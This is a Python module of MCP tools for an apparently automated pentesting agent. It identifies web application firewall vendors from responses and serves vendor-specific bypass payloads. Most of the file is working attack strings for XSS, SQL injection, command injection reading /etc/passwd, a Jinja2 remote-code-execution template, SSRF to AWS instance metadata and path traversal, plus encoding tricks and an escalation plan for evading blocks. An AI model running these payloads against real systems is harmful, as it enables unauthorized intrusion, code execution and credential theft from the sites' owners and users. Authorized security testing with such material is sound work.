"""Adaptive WAF Evasion Strategy System.

Identifies WAF vendors from response characteristics and provides
tailored bypass payloads per vulnerability class. Shares intelligence
across agents via the deliverable system.

Roadmap Tier 2.3.
"""

import json
import re
from pathlib import Path

# Injected by server.py
DATA_DIR: Path = Path(".")
_atomic_write_json = None
_append_event = None

# Path to external WAF vendor fingerprints loaded from the Awesome-WAF KB
WAF_VENDORS_JSON = Path(__file__).parent / "waf_vendors.json"
WAF_BYPASSES_JSON = Path(__file__).parent / "waf_bypasses.json"


def configure(data_dir: Path, atomic_write_fn, append_event_fn):
    """Called by server.py to inject shared dependencies."""
    global DATA_DIR, _atomic_write_json, _append_event
    DATA_DIR = data_dir
    _atomic_write_json = atomic_write_fn
    _append_event = append_event_fn


# ── WAF Fingerprint Database ─────────────────────────────────────


def _load_external_vendors():
    """Load additional WAF vendor fingerprints from JSON file."""
    try:
        if WAF_VENDORS_JSON.exists():
            with open(WAF_VENDORS_JSON) as f:
                return json.load(f)
    except Exception:
        pass
    return {}


def _get_all_signatures():
    """Return WAF_SIGNATURES merged with external vendors."""
    sigs = dict(WAF_SIGNATURES)
    sigs.update(_load_external_vendors())
    return sigs


def _load_external_bypasses():
    """Load additional WAF bypass payloads from JSON file."""
    try:
        if WAF_BYPASSES_JSON.exists():
            with open(WAF_BYPASSES_JSON) as f:
                return json.load(f)
    except Exception:
        pass
    return {}


def _get_all_bypasses():
    """Return WAF_BYPASSES merged with external bypasses."""
    bypasses = dict(WAF_BYPASSES)
    bypasses.update(_load_external_bypasses())
    return bypasses


WAF_SIGNATURES = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id", "__cfduid"],
        "server": ["cloudflare"],
        "body_patterns": [
            r"Attention Required.*Cloudflare",
            r"cf-error-details",
            r"cloudflare\.com/cdn-cgi",
            r"Ray ID:",
        ],
        "status_codes": [403, 503],
        "block_page_markers": ["cloudflare", "ray id", "cf-browser-verification"],
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id", "x-amz-apigw-id"],
        "server": [],
        "body_patterns": [
            r"<html>.*<head><title>403 Forbidden</title></head>.*</html>",
            r"Request blocked",
        ],
        "status_codes": [403],
        "block_page_markers": ["aws", "request blocked", "waf"],
    },
    "akamai": {
        "headers": ["x-akamai-session", "akamai-grn", "x-akamai-transformed"],
        "server": ["akamaighost", "akamai"],
        "body_patterns": [
            r"Reference #[0-9a-f.]+",
            r"Access Denied.*akamai",
            r"AkamaiGHost",
        ],
        "status_codes": [403],
        "block_page_markers": ["reference #", "akamai", "access denied"],
    },
    "imperva_incapsula": {
        "headers": ["x-iinfo", "x-cdn", "incap_ses_"],
        "server": [],
        "body_patterns": [
            r"incapsula incident",
            r"_Incapsula_Resource",
            r"Request unsuccessful.*Incapsula",
        ],
        "status_codes": [403],
        "block_page_markers": ["incapsula", "imperva", "incident id"],
    },
    "modsecurity": {
        "headers": ["x-mod-security", "modsecurity"],
        "server": ["modsecurity"],
        "body_patterns": [
            r"ModSecurity",
            r"mod_security",
            r"NAXSI",
            r"Request rejected",
        ],
        "status_codes": [403, 406],
        "block_page_markers": ["modsecurity", "mod_security", "request rejected"],
    },
    "f5_big_ip": {
        "headers": ["x-wa-info", "x-cnection"],
        "server": ["bigip", "big-ip"],
        "body_patterns": [
            r"BIG-IP",
            r"The requested URL was rejected",
            r"support_id",
        ],
        "status_codes": [403],
        "block_page_markers": ["big-ip", "support id", "rejected"],
    },
    "fortiweb": {
        "headers": ["fortiwafsid"],
        "server": ["fortiweb"],
        "body_patterns": [
            r"FortiWeb",
            r"\.fwb_",
            r"FortiGuard",
        ],
        "status_codes": [403],
        "block_page_markers": ["fortiweb", "fortiguard"],
    },
    "sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "server": ["sucuri"],
        "body_patterns": [
            r"sucuri\.net",
            r"Sucuri WebSite Firewall",
            r"Access Denied.*Sucuri",
        ],
        "status_codes": [403],
        "block_page_markers": ["sucuri", "website firewall"],
    },
    "barracuda": {
        "headers": ["barra_counter_session"],
        "server": ["barracuda"],
        "body_patterns": [
            r"Barracuda",
            r"barra_counter_session",
        ],
        "status_codes": [403],
        "block_page_markers": ["barracuda"],
    },
    "wordfence": {
        "headers": [],
        "server": [],
        "body_patterns": [
            r"wordfence",
            r"wfAction=",
            r"Generated by Wordfence",
            r"Your access to this site has been limited",
        ],
        "status_codes": [403, 503],
        "block_page_markers": ["wordfence", "your access to this site"],
    },
    "nginx_naxsi": {
        "headers": ["x-naxsi-sig"],
        "server": ["nginx"],
        "body_patterns": [
            r"NAXSI",
            r"Blocked By NAXSI",
        ],
        "status_codes": [403],
        "block_page_markers": ["naxsi"],
    },
    "citrix_netscaler": {
        "headers": ["cneonction", "nncoection", "ns_af"],
        "server": ["netscaler"],
        "body_patterns": [
            r"ns_af=",
            r"citrix",
            r"NetScaler",
        ],
        "status_codes": [403, 302],
        "block_page_markers": ["netscaler", "citrix"],
    },
}

# ── Per-Vendor Bypass Payloads ────────────────────────────────────

WAF_BYPASSES = {
    "cloudflare": {
        "xss": [
            {"payload": "<svg onload=alert(1)>", "technique": "SVG event handler", "level": "basic"},
            {"payload": "<details/open/ontoggle=alert`1`>", "technique": "Template literal + interactive event", "level": "intermediate"},
            {"payload": "<a href=javascript:alert(1)>", "technique": "JavaScript URI scheme", "level": "basic"},
            {"payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>", "technique": "fromCharCode encoding", "level": "intermediate"},
            {"payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "technique": "SVG animate event", "level": "advanced"},
            {"payload": "<math><mtext><table><mglyph><svg><mtext><style><path id='a]><img src=x onerror=alert(1)//>'>", "technique": "Nested math/svg tag confusion", "level": "advanced"},
        ],
        "sqli": [
            {"payload": "' OR 1=1--", "technique": "Basic auth bypass", "level": "basic"},
            {"payload": "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--", "technique": "MySQL version comment bypass", "level": "intermediate"},
            {"payload": "1'/**/union/**/select/**/1,2,3--", "technique": "Comment-based space bypass", "level": "intermediate"},
            {"payload": "1' UNION%0ASELECT%0A1,2,3--", "technique": "Newline space replacement", "level": "intermediate"},
            {"payload": "1' UN%49ON SE%4CECT 1,2,3--", "technique": "URL-encoded keyword splitting", "level": "advanced"},
            {"payload": "1' aNd 1=1 UnIoN sElEcT 1,2,3--", "technique": "Mixed case evasion", "level": "basic"},
        ],
        "cmdi": [
            {"payload": ";id", "technique": "Semicolon separator", "level": "basic"},
            {"payload": "`id`", "technique": "Backtick execution", "level": "basic"},
            {"payload": "$(id)", "technique": "Command substitution", "level": "basic"},
            {"payload": ";{id,}", "technique": "Brace expansion", "level": "intermediate"},
            {"payload": "%0aid", "technique": "Newline injection", "level": "intermediate"},
            {"payload": "a]||id||[a", "technique": "OR operator with brackets", "level": "advanced"},
        ],
        "ssti": [
            {"payload": "{{7*7}}", "technique": "Basic template expression", "level": "basic"},
            {"payload": "${7*7}", "technique": "Alternative template syntax", "level": "basic"},
            {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "technique": "Jinja2 class traversal", "level": "intermediate"},
            {"payload": "{%set a='__cla'+'ss__'%}{{''[a]}}", "technique": "String concatenation bypass", "level": "advanced"},
        ],
        "ssrf": [
            {"payload": "http://127.0.0.1", "technique": "Direct localhost", "level": "basic"},
            {"payload": "http://0x7f000001", "technique": "Hex IP encoding", "level": "intermediate"},
            {"payload": "http://2130706433", "technique": "Decimal IP encoding", "level": "intermediate"},
            {"payload": "http://127.1", "technique": "Shortened localhost", "level": "intermediate"},
            {"payload": "http://0177.0.0.1", "technique": "Octal IP encoding", "level": "intermediate"},
            {"payload": "http://[::1]", "technique": "IPv6 localhost", "level": "advanced"},
        ],
    },
    "modsecurity": {
        "xss": [
            {"payload": "<img src=x onerror=alert(1)>", "technique": "Standard event handler", "level": "basic"},
            {"payload": "<svg/onload=alert(1)>", "technique": "Slash instead of space", "level": "basic"},
            {"payload": "<body onpageshow=alert(1)>", "technique": "pageshow event", "level": "intermediate"},
            {"payload": "<%00img src=x onerror=alert(1)>", "technique": "Null byte injection", "level": "intermediate"},
            {"payload": '<a href="data:text/html,<script>alert(1)</script>">', "technique": "Data URI scheme", "level": "advanced"},
            {"payload": "'-alert(1)-'", "technique": "Expression injection (JS context)", "level": "intermediate"},
        ],
        "sqli": [
            {"payload": "1' OR '1'='1", "technique": "String comparison bypass", "level": "basic"},
            {"payload": "1'||1=1--", "technique": "Double pipe OR", "level": "basic"},
            {"payload": "1'%0bOR%0b1=1--", "technique": "Vertical tab space bypass", "level": "intermediate"},
            {"payload": "1' uNiOn(sElEcT(1),2,3)--", "technique": "Parenthesized UNION + mixed case", "level": "intermediate"},
            {"payload": "1'/*!UNION*//*!SELECT*/1,2,3--", "technique": "MySQL inline comment", "level": "intermediate"},
            {"payload": "1' ORDER BY 1,(CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END)--", "technique": "CASE-based boolean blind", "level": "advanced"},
        ],
        "cmdi": [
            {"payload": "|id", "technique": "Pipe separator", "level": "basic"},
            {"payload": "$(id)", "technique": "Command substitution", "level": "basic"},
            {"payload": "%0a/bin/cat /etc/passwd", "technique": "Newline + full path", "level": "intermediate"},
            {"payload": "$IFS$9id", "technique": "IFS variable space bypass", "level": "intermediate"},
            {"payload": 'i""d', "technique": "Empty quote insertion", "level": "advanced"},
            {"payload": "w'h'o'a'm'i", "technique": "Single quote char splitting", "level": "advanced"},
        ],
        "ssti": [
            {"payload": "{{7*7}}", "technique": "Basic expression", "level": "basic"},
            {"payload": "{{config}}", "technique": "Config dump", "level": "basic"},
            {"payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "technique": "Jinja2 RCE via request", "level": "intermediate"},
        ],
        "ssrf": [
            {"payload": "http://127.0.0.1:80", "technique": "Localhost with port", "level": "basic"},
            {"payload": "http://localtest.me", "technique": "DNS rebinding domain", "level": "intermediate"},
            {"payload": "http://spoofed.burpcollaborator.net", "technique": "OOB DNS test", "level": "intermediate"},
            {"payload": "gopher://127.0.0.1:25/", "technique": "Gopher protocol", "level": "advanced"},
        ],
    },
    "aws_waf": {
        "xss": [
            {"payload": "<img src=x onerror=prompt(1)>", "technique": "prompt() instead of alert()", "level": "basic"},
            {"payload": "<svg onload=confirm(1)>", "technique": "confirm() instead of alert()", "level": "basic"},
            {"payload": "<details open ontoggle=alert(1)>", "technique": "ontoggle event", "level": "intermediate"},
            {"payload": "<input autofocus onfocus=alert(1)>", "technique": "autofocus onfocus", "level": "intermediate"},
            {"payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>", "technique": "Context breaking polyglot", "level": "advanced"},
        ],
        "sqli": [
            {"payload": "1' OR 1=1 #", "technique": "Hash comment", "level": "basic"},
            {"payload": "1' AND/**/ 1=1--", "technique": "Inline comment space bypass", "level": "intermediate"},
            {"payload": "1' /*!UNION*/ /*!SELECT*/ 1,2--", "technique": "MySQL conditional comment", "level": "intermediate"},
            {"payload": "1' UNION ALL SELECT NULL,NULL--", "technique": "NULL-based UNION", "level": "basic"},
        ],
        "cmdi": [
            {"payload": ";id", "technique": "Semicolon", "level": "basic"},
            {"payload": "\nid\n", "technique": "Newline wrapping", "level": "intermediate"},
            {"payload": "${IFS}id", "technique": "IFS separator", "level": "intermediate"},
        ],
        "ssti": [
            {"payload": "{{7*7}}", "technique": "Basic", "level": "basic"},
            {"payload": "{{7*'7'}}", "technique": "Type confusion", "level": "basic"},
        ],
        "ssrf": [
            {"payload": "http://169.254.169.254/latest/meta-data/", "technique": "AWS IMDS v1", "level": "basic"},
            {"payload": "http://169.254.169.254/latest/api/token", "technique": "AWS IMDS v2 token", "level": "intermediate"},
            {"payload": "http://[fd00:ec2::254]/latest/meta-data/", "technique": "AWS IMDS via IPv6", "level": "advanced"},
        ],
    },
    # Generic bypasses work against most WAFs
    "_generic": {
        "xss": [
            {"payload": "<img src=x onerror=alert(1)>", "technique": "Standard img onerror", "level": "basic"},
            {"payload": "<svg onload=alert(1)>", "technique": "SVG onload", "level": "basic"},
            {"payload": "<details/open/ontoggle=alert(1)>", "technique": "Details ontoggle", "level": "intermediate"},
            {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//", "technique": "XSS polyglot", "level": "advanced"},
            {"payload": "'-alert(1)-'", "technique": "JS expression context", "level": "intermediate"},
        ],
        "sqli": [
            {"payload": "' OR 1=1--", "technique": "Classic auth bypass", "level": "basic"},
            {"payload": "' OR ''='", "technique": "String comparison", "level": "basic"},
            {"payload": "' UNION SELECT NULL--", "technique": "UNION NULL probe", "level": "basic"},
            {"payload": "' AND SLEEP(5)--", "technique": "Time-based blind", "level": "intermediate"},
            {"payload": "' AND (SELECT SUBSTRING(@@version,1,1))='5'--", "technique": "Version fingerprint", "level": "intermediate"},
        ],
        "cmdi": [
            {"payload": ";id", "technique": "Semicolon", "level": "basic"},
            {"payload": "|id", "technique": "Pipe", "level": "basic"},
            {"payload": "$(id)", "technique": "Subshell", "level": "basic"},
            {"payload": "`id`", "technique": "Backtick", "level": "basic"},
            {"payload": "%0aid", "technique": "URL-encoded newline", "level": "intermediate"},
        ],
        "ssti": [
            {"payload": "{{7*7}}", "technique": "Jinja2/Twig basic", "level": "basic"},
            {"payload": "${7*7}", "technique": "Java EL / Freemarker", "level": "basic"},
            {"payload": "#{7*7}", "technique": "Ruby ERB / Thymeleaf", "level": "basic"},
            {"payload": "<%= 7*7 %>", "technique": "ERB / ASP", "level": "basic"},
        ],
        "ssrf": [
            {"payload": "http://127.0.0.1", "technique": "Direct localhost", "level": "basic"},
            {"payload": "http://0.0.0.0", "technique": "All-interfaces bind", "level": "basic"},
            {"payload": "http://127.1", "technique": "Shortened localhost", "level": "intermediate"},
            {"payload": "http://2130706433", "technique": "Decimal IP", "level": "intermediate"},
            {"payload": "http://0x7f000001", "technique": "Hex IP", "level": "intermediate"},
        ],
        "path_traversal": [
            {"payload": "../../../etc/passwd", "technique": "Standard traversal", "level": "basic"},
            {"payload": "..%2f..%2f..%2fetc%2fpasswd", "technique": "URL-encoded slashes", "level": "intermediate"},
            {"payload": "....//....//....//etc/passwd", "technique": "Double-dot bypass", "level": "intermediate"},
            {"payload": "..%252f..%252f..%252fetc/passwd", "technique": "Double URL-encoding", "level": "advanced"},
            {"payload": "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "technique": "URL-encoded dots", "level": "intermediate"},
        ],
    },
}

# ── Encoding Strategies ───────────────────────────────────────────

ENCODING_STRATEGIES = {
    "url_encode": {
        "description": "Standard URL encoding of special characters",
        "applies_to": ["xss", "sqli", "cmdi", "ssti", "ssrf", "path_traversal"],
    },
    "double_url_encode": {
        "description": "Double URL-encode (%25xx) to bypass single-decode filters",
        "applies_to": ["xss", "sqli", "path_traversal"],
    },
    "unicode_encode": {
        "description": "Unicode encoding (%u0027 for quote, %u003c for <)",
        "applies_to": ["xss", "sqli"],
    },
    "html_entity_encode": {
        "description": "HTML entity encoding (&#60; for <, &#x3c; for <)",
        "applies_to": ["xss"],
    },
    "mixed_case": {
        "description": "Alternate character casing (uNiOn, SeLeCt, sCrIpT)",
        "applies_to": ["sqli", "xss"],
    },
    "comment_insertion": {
        "description": "Insert comments between keywords (UN/**/ION, SE/**/LECT)",
        "applies_to": ["sqli"],
    },
    "null_byte": {
        "description": "Insert null bytes (%00) to truncate string processing",
        "applies_to": ["path_traversal", "xss", "cmdi"],
    },
    "chunked_encoding": {
        "description": "Use chunked Transfer-Encoding to split payload across chunks",
        "applies_to": ["xss", "sqli", "cmdi"],
    },
    "multipart_boundary": {
        "description": "Use multipart/form-data with boundary manipulation",
        "applies_to": ["xss", "sqli", "cmdi"],
    },
    "json_content_type": {
        "description": "Send payload as JSON body (may bypass form-only WAF rules)",
        "applies_to": ["sqli", "cmdi", "ssti"],
    },
    "header_injection": {
        "description": "Inject payload in headers (X-Forwarded-For, Referer, User-Agent)",
        "applies_to": ["sqli", "ssti", "ssrf"],
    },
}


# ── WAF Identification Logic ─────────────────────────────────────


def _match_waf(headers: dict, body: str, status_code: int) -> list[dict]:
    """Match response characteristics against WAF signatures.

    Returns list of matches sorted by confidence (highest first).
    """
    matches = []
    headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
    body_lower = body.lower() if body else ""

    all_sigs = _get_all_signatures()
    for waf_name, sig in all_sigs.items():
        score = 0
        evidence = []

        # Check headers
        for header in sig["headers"]:
            if header.lower() in headers_lower:
                score += 3
                evidence.append(f"Header: {header}")

        # Check Server header
        server = headers_lower.get("server", "")
        for server_sig in sig["server"]:
            if server_sig.lower() in server:
                score += 3
                evidence.append(f"Server: {server_sig}")

        # Check body patterns
        if body:
            for pattern in sig["body_patterns"]:
                if re.search(pattern, body, re.IGNORECASE):
                    score += 2
                    evidence.append(f"Body pattern: {pattern[:40]}")

        # Check block page markers
        for marker in sig["block_page_markers"]:
            if marker in body_lower:
                score += 1
                evidence.append(f"Block marker: {marker}")

        # Status code correlation
        if status_code in sig["status_codes"]:
            score += 1

        if score >= 2:
            matches.append(
                {
                    "waf": waf_name,
                    "confidence": min(score / 8 * 100, 100),
                    "evidence": evidence,
                }
            )

    matches.sort(key=lambda x: x.get("confidence", 0) or 0, reverse=True)
    return matches


# ── MCP Tool Functions ───────────────────────────────────────────


def identify_waf(
    response_headers: str,
    response_body: str = "",
    status_code: int = 403,
) -> str:
    """Identify WAF vendor from HTTP response characteristics.

    Analyzes response headers, body content, and status codes against
    a database of WAF signatures to identify the WAF vendor and version.

    Args:
        response_headers: Raw response headers as a string (Header: Value, one per line)
        response_body: Response body text (block page content). Can be empty.
        status_code: HTTP status code of the response (default 403)
    """
    # Parse headers from string
    headers = {}
    for line in response_headers.strip().split("\n"):
        line = line.strip()
        if ":" in line:
            key, _, val = line.partition(":")
            headers[key.strip()] = val.strip()

    matches = _match_waf(headers, response_body, status_code)

    if not matches:
        return (
            "**WAF Detection**: No known WAF identified.\n\n"
            "The response does not match signatures for any known WAF vendor. "
            "This could mean: (1) no WAF is present, (2) a custom/unknown WAF, "
            "or (3) the WAF is transparent and doesn't modify responses.\n\n"
            "**Recommendation**: Try sending an obvious attack payload "
            "(e.g., `<script>alert(1)</script>` or `' OR 1=1--`) and analyze "
            "the block response to identify WAF characteristics."
        )

    lines = ["# WAF Detection Results\n"]
    for i, match in enumerate(matches):
        confidence = match["confidence"]
        level = "HIGH" if confidence >= 70 else ("MEDIUM" if confidence >= 40 else "LOW")
        lines.append(f"## {i+1}. {match['waf'].replace('_', ' ').title()} ({level} confidence: {confidence:.0f}%)\n")
        lines.append("**Evidence:**")
        for ev in match["evidence"]:
            lines.append(f"- {ev}")
        lines.append("")

    primary = matches[0]["waf"]
    lines.append(f"**Primary WAF**: `{primary}`")
    lines.append(f"\nUse `get_waf_bypass('{primary}', '<vuln_class>')` to get tailored bypass payloads.")

    return "\n".join(lines)


def get_waf_bypass(
    waf_vendor: str,
    vuln_class: str,
    bypass_level: str = "all",
) -> str:
    """Get WAF bypass payloads tailored to a specific vendor and vulnerability class.

    Returns payloads ordered by bypass complexity (basic -> intermediate -> advanced),
    plus applicable encoding strategies.

    Args:
        waf_vendor: WAF vendor name (e.g., 'cloudflare', 'modsecurity', 'aws_waf',
            'akamai', 'imperva_incapsula', 'f5_big_ip', 'fortiweb', 'sucuri',
            'barracuda', 'wordfence', 'nginx_naxsi', 'citrix_netscaler')
            Use '_generic' for unknown WAFs.
        vuln_class: Vulnerability class to bypass for (e.g., 'xss', 'sqli', 'cmdi',
            'ssti', 'ssrf', 'path_traversal')
        bypass_level: Filter by level: 'basic', 'intermediate', 'advanced', or 'all' (default)
    """
    valid_levels = {"basic", "intermediate", "advanced", "all"}
    if bypass_level not in valid_levels:
        return f"Invalid bypass_level '{bypass_level}'. Must be one of: {', '.join(sorted(valid_levels))}"

    vendor = waf_vendor.lower().strip()
    vuln = vuln_class.lower().strip()

    # Merge external bypasses
    all_bypass_data = _get_all_bypasses()

    # Get vendor-specific bypasses
    vendor_bypasses = all_bypass_data.get(vendor, {}).get(vuln, [])
    # Always include generic bypasses
    generic_bypasses = all_bypass_data.get("_generic", {}).get(vuln, [])

    all_bypasses = vendor_bypasses + [{**b, "technique": f"[generic] {b['technique']}"} for b in generic_bypasses if b["payload"] not in {vb["payload"] for vb in vendor_bypasses}]

    if bypass_level != "all":
        all_bypasses = [b for b in all_bypasses if b.get("level") == bypass_level]

    if not all_bypasses:
        known_vendors = sorted(all_bypass_data.keys())
        known_vulns = sorted({k for v in all_bypass_data.values() for k in v})
        return (
            f"No bypass payloads found for WAF='{vendor}', vuln_class='{vuln}'.\n\n"
            f"**Known WAF vendors**: {', '.join(known_vendors)}\n"
            f"**Known vuln classes**: {', '.join(sorted(known_vulns))}\n\n"
            f"Try using '_generic' as the WAF vendor for universal bypass payloads."
        )

    # Build output
    lines = [f"# WAF Bypass Payloads: {vendor} / {vuln}\n"]

    if vendor in all_bypass_data:
        lines.append(f"**WAF**: {vendor.replace('_', ' ').title()}")
    else:
        lines.append("**WAF**: Generic (unknown vendor)")
    lines.append(f"**Target vuln class**: {vuln}")
    lines.append(f"**Payloads**: {len(all_bypasses)}\n")

    # Group by level
    for level in ["basic", "intermediate", "advanced"]:
        level_payloads = [b for b in all_bypasses if b.get("level") == level]
        if not level_payloads:
            continue
        lines.append(f"## {level.title()} ({len(level_payloads)})\n")
        for i, bp in enumerate(level_payloads, 1):
            lines.append(f"{i}. **{bp['technique']}**")
            lines.append("   ```")
            lines.append(f"   {bp['payload']}")
            lines.append("   ```")
        lines.append("")

    # Add encoding strategies
    applicable_encodings = [(name, info) for name, info in ENCODING_STRATEGIES.items() if vuln in info["applies_to"]]
    if applicable_encodings:
        lines.append("## Encoding Strategies\n")
        lines.append("Apply these encoding methods to any payload above:\n")
        for name, info in applicable_encodings:
            lines.append(f"- **{name}**: {info['description']}")

    # Add escalation strategy
    lines.extend(
        [
            "",
            "## Escalation Strategy",
            "",
            "1. Try **basic** payloads first (fastest feedback)",
            "2. If blocked, try **intermediate** with encoding strategies",
            "3. If still blocked, try **advanced** payloads",
            "4. Combine advanced payloads with double-encoding or chunked encoding",
            "5. Try alternative delivery (JSON body, multipart, header injection)",
            "6. If all blocked, document as `potential` with bypass attempts in evidence",
        ]
    )

    return "\n".join(lines)


def list_waf_vendors() -> str:
    """List all WAF vendors in the fingerprint database with their signature counts.

    Returns a formatted list of supported WAFs that can be identified
    and bypassed.
    """
    lines = ["# Supported WAF Vendors\n"]
    lines.append("| Vendor | Headers | Body Patterns | Block Markers | Bypass Classes |")
    lines.append("|--------|---------|---------------|---------------|----------------|")

    all_sigs = _get_all_signatures()
    all_bypasses = _get_all_bypasses()
    for vendor, sig in sorted(all_sigs.items()):
        bypass_classes = sorted(all_bypasses.get(vendor, {}).keys())
        bypass_str = ", ".join(bypass_classes) if bypass_classes else "generic only"
        hdrs: list = sig.get("headers", [])
        bps: list = sig.get("body_patterns", [])
        bpm: list = sig.get("block_page_markers", [])
        lines.append(f"| {vendor.replace('_', ' ').title()} | {len(hdrs)} | {len(bps)} | {len(bpm)} | {bypass_str} |")

    lines.extend(
        [
            "",
            f"**Total vendors**: {len(all_sigs)}",
            "",
            "Use `identify_waf(headers, body, status_code)` to detect which WAF is in use.",
            "Use `get_waf_bypass(vendor, vuln_class)` to get tailored bypass payloads.",
            "Use `'_generic'` as vendor for universal bypass payloads against unknown WAFs.",
        ]
    )

    return "\n".join(lines)
